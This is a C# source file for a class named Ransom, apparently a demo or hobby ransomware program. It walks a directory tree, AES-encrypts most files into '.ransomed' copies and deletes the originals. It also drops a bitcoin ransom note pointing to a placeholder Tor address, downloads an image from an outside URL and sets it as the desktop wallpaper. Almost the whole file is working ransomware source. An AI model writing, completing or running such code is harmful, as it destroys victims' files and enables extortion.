using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    public class Ransom
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(
            int uAction,
            int uParam,
            string lpvParam,
            int fuWinIni);

        public string FuncEncrypt(string Dpath, string key)
        {
            if (key == "")
            {
                //key = Generate256BitKey();
                key = Generate256BitKey();
            }

            Console.WriteLine("Key is " + key);
            Console.WriteLine("Encrypted Text Done");

            try
            {
                // Get all files in the directory and its subdirectories
                Console.WriteLine("All files (including subdirectories):");
                //foreach (string Dpath in DirectoryPaths)
                //{
                string[] allFiles = Directory.GetFiles(Dpath, "*.*", SearchOption.AllDirectories);
                foreach (string file in allFiles)
                {
                    if (Path.GetExtension(file) == ".ransomed" || Path.GetExtension(file) == ".dll" || Path.GetExtension(file) == ".exe" || Path.GetExtension(file) == ".ini")
                        continue;
                    Console.WriteLine($"{file}");
                    byte[] toEncrypt = File.ReadAllBytes(file);
                    byte[] encryptedBytes = EncryptBytesToBytes_Aes(toEncrypt, key);
                    File.WriteAllBytes(file + ".ransomed", encryptedBytes);
                    File.SetAttributes(file, FileAttributes.Normal);
                    File.Delete(file);
                }

                HoneyNote(Dpath);
                //}
                // Change wallpaper

                string imageUrl = "https://www.smart-energy.com/wp-content/uploads/2022/01/Red-Balloon-ransomware-bear-screen-1-pgsc78q141ha3gc2gqnhxfknxw1ty4ud66f0jq793m_00001_01.jpg";

                // Local path to save the image
                string localImagePath = Path.Combine(Path.GetTempPath(), "honey.jpg");
                DownloadImageAsync(imageUrl, localImagePath);

                bool result = SetWallpaper(localImagePath);

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }

            return key;
        }

        static void DownloadImageAsync(string url, string filePath)
        {
            using HttpClient client = new HttpClient();
            HttpResponseMessage response = client.GetAsync(url).Result;
            response.EnsureSuccessStatusCode();

            byte[] imageData = response.Content.ReadAsByteArrayAsync().Result;
            File.WriteAllBytes(filePath, imageData);

            Console.WriteLine($"Image downloaded and saved to {filePath}");
        }


        static bool SetWallpaper(string filePath)
        {
            int SPIF_SENDCHANGE = 0x02;
            int SPI_SETDESKWALLPAPER = 0x0014;
            int SPIF_UPDATEINIFILE = 0x01;
            // Set the wallpaper and update the registry
            int result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            return result != 0; // Return true if successful
        }

        public static string Generate256BitKey()
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.KeySize = 256; // Set the key size to 256 bits
                aesAlg.GenerateKey(); // Generate a random 256-bit key
                return Convert.ToBase64String(aesAlg.Key);
            }
        }

        public static void HoneyNote(string Directory)
        {
            string Note = " \n~~~AnonBear. The wealthiest bear in town~~~ \n \n>>>> Your data is encrypted... but dont freak out \n \nIf we encrypted you, you majorly fucked up. But... all can be saved \nBut not for free, we require a juicy honey payment (We mean bitcoin. Honey is bitcoin) \n \n>>>> What guarantees that we will not deceive you?  \n \nWe are not a politically motivated group and we do not need anything other than your money.  \n     \nIf you pay, we will provide you the programs for decryption. \nLife is too short to be sad. Dont be sad money is only paper. Your files are more important than paper right? \n     \nIf we do not give you decrypter then nobody will pay us in the future.  \nTo us, our reputation is very important. There is no dissatisfied victim after payment. \n     \n \n>>>> You may contact us and decrypt one file for free on these TOR sites with your personal DECRYPTION ID \n \nDownload and install TOR Browser https://www.torproject.org/ \nWrite to a chat and wait for the answer, we will always answer you.  \nSometimes you will need to wait a while \n \nLinks for Tor Browser: \nhttp://AnonBearcklasldkmNotARealOnionLink.onion/ \n \n>>>> Your personal DECRYPTION ID: AKLJNCKJN123KJANKJNC \n \n>>>> Warning! Do not DELETE or MODIFY any files, it can lead to recovery problems!";
            try
            {
                // Write the paragraph to the file
                File.WriteAllText(Directory + @"\OHNO.txt", Note);
                Console.WriteLine("Paragraph written to file successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        public static byte[] EncryptBytesToBytes_Aes(byte[] plainBytes, string key)
        {
            byte[] encrypted;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Convert.FromBase64String(key);
                aesAlg.IV = new byte[aesAlg.BlockSize / 8]; // IV should be the same size as the block size
                aesAlg.Mode = CipherMode.CBC; // Set the mode to CBC
                aesAlg.Padding = PaddingMode.PKCS7; // Use PKCS7 padding

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        csEncrypt.Write(plainBytes, 0, plainBytes.Length);
                        csEncrypt.FlushFinalBlock(); // Ensure all data is written
                    }
                    encrypted = msEncrypt.ToArray();
                }
            }

            return encrypted;
        }

    }
}
